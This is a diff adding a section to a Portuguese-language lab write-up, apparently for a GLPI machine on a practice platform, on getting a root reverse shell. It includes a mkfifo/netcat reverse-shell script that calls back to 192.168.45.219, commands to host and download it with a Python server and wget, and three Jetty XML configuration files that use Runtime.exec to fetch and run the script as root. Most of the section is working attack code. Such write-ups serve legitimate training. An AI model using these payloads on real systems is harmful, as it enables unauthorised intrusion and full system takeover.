@@ -198,3 +198,108 @@ nc -nlvp 1337
 ```
 
 ![image](https://github.com/user-attachments/assets/3a3417c6-1f08-486f-adbe-76370d34013f)
+
+
+### Reverse Shell as root
+
+Primeiro, você cria um arquivo chamado revshell.sh com o seguinte conteúdo:
+
+```
+#!/bin/bash
+
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.45.219 80 >/tmp/f
+```
+
+Esse script cria um named pipe (mkfifo), redireciona a entrada e saída para o shell (sh -i) e estabelece uma conexão de rede reversa (nc) para a sua máquina com o endereço 192.168.45.219 na porta 80.
+
+Em seguida, você inicia um servidor web simples com Python para hospedar o arquivo e permitir que ele seja baixado pela máquina alvo:
+
+```
+┌──(kali㉿kali)-[~/pg/GLPI/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
+```
+
+Agora, o servidor está pronto para servir o arquivo revshell.sh. O próximo passo é baixar esse arquivo na máquina alvo (como root).
+
+![image](https://github.com/user-attachments/assets/6e77e47f-946f-4eab-aa92-678217033737)
+
+Baixar o arquivo revshell.sh:
+
+```
+wget http://192.168.45.219/revshell.sh -O revshell.sh
+```
+Baixa o arquivo revshell.sh do servidor 192.168.45.219 e salva-o no sistema local com o nome revshell.sh.
+
+Listar o conteúdo do diretório:
+
+```
+ls -lav
+```
+Lista detalhadamente os arquivos do diretório atual, mostrando permissões, proprietário, grupo, tamanho, etc.
+
+Tornar o script executável e executá-lo:
+
+```
+chmod +x revshell.sh ; ./revshell.sh
+```
+chmod +x revshell.sh: Torna o script revshell.sh executável.
+./revshell.sh: Executa o script revshell.sh que foi baixado.
+
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+ <Call class="java.lang.Runtime" name="getRuntime">
+  <Call name="exec">
+   <Arg>
+    <Array type="String">
+     <Item>/bin/sh</Item>
+     <Item>-c</Item>
+     <Item>curl -F "r=`wget http://192.168.45.219/revshell.sh -O revshell.sh`" http://127.0.0.1:1337</Item>
+    </Array>
+   </Arg>
+  </Call>
+ </Call>
+</Configure>
+
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+ <Call class="java.lang.Runtime" name="getRuntime">
+  <Call name="exec">
+   <Arg>
+    <Array type="String">
+     <Item>/bin/sh</Item>
+     <Item>-c</Item>
+     <Item>curl -F "r=`ls -lav`" http://127.0.0.1:1337</Item>
+    </Array>
+   </Arg>
+  </Call>
+ </Call>
+</Configure>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+ <Call class="java.lang.Runtime" name="getRuntime">
+  <Call name="exec">
+   <Arg>
+    <Array type="String">
+     <Item>/bin/sh</Item>
+     <Item>-c</Item>
+     <Item>curl -F "r=`chmod +x revshell.sh ; ./revshell.sh`" http://127.0.0.1:1337</Item>
+    </Array>
+   </Arg>
+  </Call>
+ </Call>
+</Configure>
+
+```
+
+![image](https://github.com/user-attachments/assets/37d7451e-5040-49cc-bcd5-3e57b72e2894)
